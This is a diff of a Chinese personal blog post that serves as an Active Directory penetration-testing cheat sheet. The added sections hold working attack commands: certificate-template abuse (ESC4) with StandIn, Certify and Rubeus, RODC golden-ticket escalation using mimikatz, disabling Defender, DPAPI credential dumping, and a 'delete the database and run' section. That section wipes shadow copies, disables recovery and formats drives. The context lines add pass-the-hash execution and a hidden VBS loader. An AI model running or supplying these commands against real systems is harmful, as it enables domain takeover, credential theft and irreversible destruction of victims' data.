@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="ntp方式# 信息收集-枚举\n前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rntp方式\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 手动方式\r或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; smb方式（隧道环境尤为好用）\r密码\nnet time -S $ip -U &#34;$domain/$user%$pass&#34; # 代理 sudo proxychains4 net time set -S $ip -U &#34;$domain/$user%$pass&#34; hash\nnet time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash # 代理 sudo proxychains4 net time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash tgt\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rntp方式\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 手动方式\r或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; smb方式（隧道环境尤为好用）\r密码\nnet time -S $ip -U &#34;$domain/$user%$pass&#34; # 代理 sudo proxychains4 net time set -S $ip -U &#34;$domain/$user%$pass&#34; hash\nnet time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash # 代理 sudo proxychains4 net time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash tgt\n">
 <title>血缇之书</title>
 
 <link rel='canonical' href='https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
 
 <link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="血缇之书">
-<meta property='og:description' content="ntp方式# 信息收集-枚举\n前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rntp方式\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 手动方式\r或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; smb方式（隧道环境尤为好用）\r密码\nnet time -S $ip -U &#34;$domain/$user%$pass&#34; # 代理 sudo proxychains4 net time set -S $ip -U &#34;$domain/$user%$pass&#34; hash\nnet time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash # 代理 sudo proxychains4 net time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash tgt\n">
+<meta property='og:description' content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rntp方式\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 手动方式\r或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; smb方式（隧道环境尤为好用）\r密码\nnet time -S $ip -U &#34;$domain/$user%$pass&#34; # 代理 sudo proxychains4 net time set -S $ip -U &#34;$domain/$user%$pass&#34; hash\nnet time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash # 代理 sudo proxychains4 net time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash tgt\n">
 <meta property='og:url' content='https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/'>
 <meta property='og:site_name' content='wackymaker'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-10-31T19:40:56&#43;08:00'/><meta property='article:modified_time' content='2025-10-31T19:40:56&#43;08:00'/>
 <meta name="twitter:title" content="血缇之书">
-<meta name="twitter:description" content="ntp方式# 信息收集-枚举\n前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rntp方式\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 手动方式\r或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; smb方式（隧道环境尤为好用）\r密码\nnet time -S $ip -U &#34;$domain/$user%$pass&#34; # 代理 sudo proxychains4 net time set -S $ip -U &#34;$domain/$user%$pass&#34; hash\nnet time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash # 代理 sudo proxychains4 net time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash tgt\n">
+<meta name="twitter:description" content="信息收集-枚举\r前枚举\r域名解析\rnxc\nnxc smb ip --generate-hosts-file hostname 也可以生成krb5.conf\nnxc smb $ip --generate-krb5-file krb5.conf 删除原conf\nsudo rm /etc/krb5.conf 替换\nsudo mv krb5.conf /etc/krb5.conf 同步时间\rntp方式\rsudo ntpdate dc 并停止自动更改 sudo service virtualbox-guest-utils stop 手动方式\r或者在域机器执行\nGet-Date 本机修改\nsudo timedatectl set-ntp off sudo date -s &#34;2025-06-12 04:02:28&#34; smb方式（隧道环境尤为好用）\r密码\nnet time -S $ip -U &#34;$domain/$user%$pass&#34; # 代理 sudo proxychains4 net time set -S $ip -U &#34;$domain/$user%$pass&#34; hash\nnet time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash # 代理 sudo proxychains4 net time -S $ip -U &#34;$domain/$user&#34; -N --pw-nt-hash $hash tgt\n">
     </head>
     <body class="
     article-page
@@ -504,6 +504,7 @@
     </li>
     <li><a href="#sliver使用相关">sliver使用相关</a>
       <ul>
+        <li><a href="#bof">bof</a></li>
         <li><a href="#载荷会话外使用">载荷会话外使用</a></li>
         <li><a href="#载荷会话内使用">载荷会话内使用</a></li>
       </ul>
@@ -608,6 +609,7 @@
     <li><a href="#本地全局查找文件">本地全局查找文件</a></li>
     <li><a href="#传递文件传文件">传递文件——传文件</a>
       <ul>
+        <li><a href="#分块传输">分块传输</a></li>
         <li><a href="#base64传文件">base64传文件</a></li>
         <li><a href="#windows上传文件">windows上传文件</a></li>
         <li><a href="#通用反向上传脚本uploadspy">通用反向上传脚本（uploads.py）</a></li>
@@ -619,7 +621,7 @@
     <li><a href="#各工具ntlm认证禁用处理方式-kerbores认证">各工具ntlm认证禁用处理方式-kerbores认证</a>
       <ul>
         <li><a href="#impacket包">impacket包</a></li>
-        <li><a href="#nxc-3">nxc</a></li>
+        <li><a href="#nxc-4">nxc</a></li>
         <li><a href="#bloodhound-python-1">bloodhound-python</a></li>
         <li><a href="#bloodyad-1">bloodyad</a></li>
         <li><a href="#certipy-ad-2">certipy-ad</a></li>
@@ -709,8 +711,8 @@
     <section class="article-content">
     
     
-    <p>ntp方式# 信息收集-枚举</p>
-<h2 id="前枚举">前枚举
+    <h1 id="信息收集-枚举">信息收集-枚举
+</h1><h2 id="前枚举">前枚举
 </h2><h3 id="域名解析">域名解析
 </h3><p>nxc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc smb ip --generate-hosts-file hostname
@@ -1286,7 +1288,7 @@ nxc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-psexec <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">/</span>$user<span style="color:#e6db74">@</span>$ip<span style="color:#e6db74">&#34;</span> -hashes $hashes -no-pass
 </span></span></code></pre></div><p>使用票据</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-psexec <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">/</span>$user<span style="color:#e6db74">@</span>$ip<span style="color:#e6db74">&#34;</span> -k -no-pass
-</span></span></code></pre></div><h4 id="本地计算机用户">本地计算机用户
+</span></span></code></pre></div><h4 id="域内本地计算机用户">域内本地计算机用户
 </h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-psexec <span style="color:#e6db74">&#39;.\$user&#39;</span>:$pass@$ip
 </span></span></code></pre></div><p>使用hash</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-psexec <span style="color:#e6db74">&#39;.\$user&#39;</span>@$ip -hashes $hashes -no-pass
@@ -1299,7 +1301,7 @@ nxc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-smbexec <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">/</span>$user<span style="color:#e6db74">@</span>$ip<span style="color:#e6db74">&#34;</span> -hashes $hashes -no-pass
 </span></span></code></pre></div><p>使用票据</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-smbexec <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">/</span>$user<span style="color:#e6db74">@</span>$ip<span style="color:#e6db74">&#34;</span> -k -no-pass
-</span></span></code></pre></div><h4 id="本地计算机用户-1">本地计算机用户
+</span></span></code></pre></div><h4 id="域内本地计算机用户-1">域内本地计算机用户
 </h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-smbexec <span style="color:#e6db74">&#39;.\$user&#39;</span>:$pass@$ip<span style="color:#e6db74">&#34;
 </span></span></span></code></pre></div><p>使用hash</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-smbexec <span style="color:#e6db74">&#39;.\$user&#39;</span>@$ip -hashes $hashes -no-pass
@@ -1312,7 +1314,7 @@ nxc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-wmiexec <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">/</span>$user<span style="color:#e6db74">@</span>$ip<span style="color:#e6db74">&#34;</span> -hashes $hashes -no-pass
 </span></span></code></pre></div><p>传递票据</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-wmiexec <span style="color:#e6db74">&#34;</span>$domain<span style="color:#e6db74">/</span>$user<span style="color:#e6db74">@</span>$ip<span style="color:#e6db74">&#34;</span> -k -no-pass
-</span></span></code></pre></div><h4 id="本地计算机用户-2">本地计算机用户
+</span></span></code></pre></div><h4 id="域内本地计算机用户-2">域内本地计算机用户
 </h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-wmiexec <span style="color:#e6db74">&#39;.\$user&#39;</span>:$pass@$ip
 </span></span></code></pre></div><p>传递hash</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-wmiexec <span style="color:#e6db74">&#39;.\$user&#39;</span>@$ip -hashes $hashes -no-pass
@@ -2983,7 +2985,8 @@ nxc</p>
 </span></span></code></pre></div><p>比如上面查到管理员sid为S-1-5-21-2983547755-698260136-4283918172-500，则可以将-upn &lsquo;administrator@$domain&rsquo; ，添加上-sid S-1-5-21-2983547755-698260136-4283918172-500，变成这样</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>certipy req -u $user@$doamin -p <span style="color:#e6db74">&#39;$pass&#39;</span> -ca $ca -target $FQDN_ca -template <span style="color:#e6db74">&#39;CorpKerbAuth&#39;</span> -upn <span style="color:#e6db74">&#39;administrator@$domain&#39;</span> -sid S-1-5-21-2983547755-698260136-4283918172-500 -out <span style="color:#e6db74">&#39;cert&#39;</span> -dc-ip $ip
 </span></span></code></pre></div><h3 id="esc4">ESC4
-</h3><p>esc4的原理是某个证书被配置了某权限能全权更改或者编辑的设置，如果我们有这个更改权限就能打esc4</p>
+</h3><h4 id="远程">远程
+</h4><p>esc4的原理是某个证书被配置了某权限能全权更改或者编辑的设置，如果我们有这个更改权限就能打esc4</p>
 <p>最基础的打法就是将证书修改为esc1的类型，之后直接打esc1，certipy在4.8与5.02的命令不同，以下我记录的是5.02版本</p>
 <p>首先更改目标模板为esc1类型</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>certipy template -u $user@$domain -hashes $ntlm -template &lt;模板名称&gt; -write-default-configuration -no-save
@@ -2993,8 +2996,19 @@ nxc</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>certipy req -u $user@$domain -hashes $ntlm -ca $ca -template &lt;模板名称&gt; -upn administrator@$domain 
 </span></span><span style="display:flex;"><span>或者
 </span></span><span style="display:flex;"><span>certipy req -u $user@$domain -p $pass -ca $ca -template &lt;模板名称&gt; -upn administrator@$domain 
-</span></span></code></pre></div><p>亲求管理员hash</p>
+</span></span></code></pre></div><p>请求管理员hash</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>certipy auth -pfx administrator.pfx -dc-ip $ip
+</span></span></code></pre></div><h4 id="本地">本地
+</h4><p>修改为esc1</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>.<span style="color:#ae81ff">\S</span>tandIn_v13_Net35.exe --ADCS --filter Machine --ess --add
+</span></span></code></pre></div><p>赋予域用户注册权</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>.<span style="color:#ae81ff">\S</span>tandIn_v13_Net35.exe --ADCS --filter Machine --ntaccount <span style="color:#e6db74">&#34;domain\domain users&#34;</span> --enroll --add
+</span></span></code></pre></div><p>请求管理员证书</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Certify.exe request /ca:dc01.mythical-us.vl<span style="color:#ae81ff">\m</span>ythical-us-DC01-CA /template:Machine /altname:administrator@mythical-us.vl
+</span></span></code></pre></div><p>将输出保存为pem并转换</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>openssl pkcs12 -in cert.pem -keyex -CSP <span style="color:#e6db74">&#34;Microsoft Enhanced Cryptographic Provider v1.0&#34;</span> -export -out cert.pfx
+</span></span></code></pre></div><p>使用rubeus获取hash</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>.<span style="color:#ae81ff">\R</span>ubeus.exe asktgt /user:Administrator /certificate:C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\M</span>omo.Ayase<span style="color:#ae81ff">\c</span>ert.pfx /ptt /nowrap /getcredentials
 </span></span></code></pre></div><h3 id="esc8">ESC8
 </h3><p>参考文章</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>https://vuln.dev/vulnlab-cicada/#exploitation
@@ -3407,7 +3421,7 @@ targetedKerberoast.py</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>set-DomainObject -identity $user -SET @<span style="color:#f92672">{</span>serviceprincipalname<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;test/$host&#39;</span><span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>之后直接打Invoke-Kerberost，或者利用如下面命令请求tgt之后搞到v2hash，只需要powerview</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Get-DomainUSer RSA_4810 | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash
-</span></span></code></pre></div><h5 id="远程">远程
+</span></span></code></pre></div><h5 id="远程-1">远程
 </h5><p>targetedKerberoast.py</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py
 </span></span><span style="display:flex;"><span>targetedKerberoast.py -v -d <span style="color:#e6db74">&#34;</span>$DC_HOST<span style="color:#e6db74">&#34;</span> -u <span style="color:#e6db74">&#34;</span>$USER<span style="color:#e6db74">&#34;</span> -p <span style="color:#e6db74">&#34;</span>$PASSWORD<span style="color:#e6db74">&#34;</span> --dc-ip $ip
@@ -3550,7 +3564,9 @@ targetedKerberoast.py</p>
 </span></span><span style="display:flex;"><span>run
 </span></span></code></pre></div><p>msf不适合自己做持久化，因为其生成的exe都是报毒的</p>
 <h2 id="sliver使用相关">sliver使用相关
-</h2><p>部署相关，一般直接开包即用，如果是vps环境建议部署如下两个辅助工具</p>
+</h2><h3 id="bof">bof
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>https://github.com/sliverarmory
+</span></span></code></pre></div><p>部署相关，一般直接开包即用，如果是vps环境建议部署如下两个辅助工具</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo apt install wireguard-tools
 </span></span><span style="display:flex;"><span>apt install git mingw-w64
 </span></span></code></pre></div><p>也可以一键直接部署</p>
@@ -3604,7 +3620,32 @@ targetedKerberoast.py</p>
 </span></span></code></pre></div><p>loader.vbs</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>set ws<span style="color:#f92672">=</span>WScript.CreateObject<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;WScript.Shell&#34;</span><span style="color:#f92672">)</span>ws.Run <span style="color:#e6db74">&#34;start.bat&#34;</span>,0
 </span></span></code></pre></div><h1 id="后渗透利用">后渗透利用
-</h1><h2 id="defender相关">defender相关
+</h1><h1 id="删库跑路">删库跑路
+</h1><p>禁用所有恢复数据的策略</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>cmd.exe /c vssadmin.exe Delete Shadows /All /Quiet &amp; bcdedit /set <span style="color:#f92672">{</span>default<span style="color:#f92672">}</span> recoveryenabled No &amp; bcdedit /set <span style="color:#f92672">{</span>default<span style="color:#f92672">}</span> bootstatuspolicy ignoreallfailures
+</span></span></code></pre></div><p>删库</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Remove-Item -Path <span style="color:#e6db74">&#34;C:\Your\Path&#34;</span> -Recurse -Force
+</span></span></code></pre></div><p>填充无意义字符</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>cipher /w:C:<span style="color:#ae81ff">\Y</span>our<span style="color:#ae81ff">\P</span>ath
+</span></span></code></pre></div><p>或者格式化盘符</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>format D: /fs:ntfs /p:1 /q
+</span></span></code></pre></div><h1 id="rodc相关">rodc相关
+</h1><p>获取rodc管理员后，我们可以横向至主域，目前没有找到远程利用方式，主要使用powerview以及鲁博本地攻击</p>
+<p>第一步，获取当前rodc的krbtgt用户hash，用户名称格式一般位krbtgt_$奇怪数字</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>.<span style="color:#ae81ff">\m</span>imikatz.exe <span style="color:#e6db74">&#34;Privilege::Debug&#34;</span> <span style="color:#e6db74">&#34;log&#34;</span> <span style="color:#e6db74">&#34;lsadump::lsa /patch&#34;</span> <span style="color:#e6db74">&#34;exit&#34;</span>
+</span></span></code></pre></div><p>第二步，注入powerview，并将域管理员添加允许同步时rodc属性</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Import-Module .<span style="color:#ae81ff">\P</span>owerView.ps1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>清空属性
+</span></span><span style="display:flex;"><span>Set-DomainObject -Identity <span style="color:#e6db74">&#39;CN=RODC,OU=Domain Controllers,DC=$domain,DC=local&#39;</span> -Clear <span style="color:#e6db74">&#39;msDS-NeverRevealGroup&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>添加属性
+</span></span><span style="display:flex;"><span>Set-DomainObject -Identity <span style="color:#e6db74">&#39;CN=RODC,OU=Domain Controllers,DC=$domain,DC=local&#39;</span> -Set @<span style="color:#f92672">{</span><span style="color:#e6db74">&#39;msDS-RevealOnDemandGroup&#39;</span><span style="color:#f92672">=</span>@<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;CN=Administrator,CN=Users,DC=$domain,DC=local&#39;</span><span style="color:#f92672">)}</span>
+</span></span></code></pre></div><p>第三步，构造黄金票据</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>.<span style="color:#ae81ff">\R</span>ubeus.exe golden /rodcNumber:$krbtgt的数字 /rc4:$krbtgt_rodc_hash /user:administrator /id:500 /domain:$domain /sid:$domain_sid /nowrap
+</span></span></code></pre></div><p>第四步，请求域管理hash</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>.<span style="color:#ae81ff">\R</span>ubeus.exe asktgs /enctype:rc4 /keyList /service:krbtgt/$domain /dc:$dc_FQDN /ticket:doIFpjCCBaKgLhYad......
+</span></span></code></pre></div><h2 id="defender相关">defender相关
 </h2><h3 id="添加排除目录">添加排除目录
 </h3><p>生成一个c:/temp目录并且使defender绕过扫描它</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>mkdir c:/temp
@@ -3615,6 +3656,7 @@ targetedKerberoast.py</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell.exe -Command <span style="color:#e6db74">&#34;Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring&#34;</span>
 </span></span></code></pre></div><h3 id="关闭defender">关闭defender
 </h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cmd /c <span style="color:#e6db74">&#34;sc stop WinDefend&#34;</span>
+</span></span><span style="display:flex;"><span>cmd /c <span style="color:#e6db74">&#34;net stop WdNisSvc&#34;</span>
 </span></span></code></pre></div><h2 id="后门相关">后门相关
 </h2><h3 id="后门机器账户创建">后门机器账户创建
 </h3><p>首先查看当前用户有多少个计算机用户可以创建</p>
@@ -3908,11 +3950,14 @@ sekurlsa::logonPasswords full
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Protect\&lt;sid&gt;&gt;dir /a
 </span></span></code></pre></div><h4 id="解masterkey举例">解masterkey(举例)
 </h4><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-dpapi masterkey -file cb5f08bd-480d-4d6e-9d2d-1d18c94fcb74 -sid S-1-5-21-298176814-2846777796-698167141-1103 -password <span style="color:#e6db74">&#39;Th3C@ll0fCtHu1hu!&#39;</span>
-</span></span></code></pre></div><h4 id="-解cred举例">#### 解cred（举例）
+</span></span></code></pre></div><h4 id="解cred举例">解cred（举例）
 </h4><p>目标文件获取</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Credentials&gt;dir /a
 </span></span></code></pre></div><p>利用上一步解密出来的masterkey解密</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-dpapi credential -file A2E4656BCBABFD9279E090E8482A7141 -key 0x0ff22e711e14912c168ec3943e2478081930413b24795f45028bf15992aebc0b5b0954128398441a4c2578c90e5c2da71bc678d8d5a4e66836e9f083e20eeb27
+</span></span></code></pre></div><h4 id="nxc-3">nxc
+</h4><p>最权威的一个，一键利用域管理抓取所有敏感信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc smb $ip -u administrator -p $pass --dpapi
 </span></span></code></pre></div><h2 id="linux相关-3">linux相关
 </h2><h3 id="部署ssh公钥后门">部署ssh公钥后门
 </h3><p>首先在本地生成公钥私钥</p>
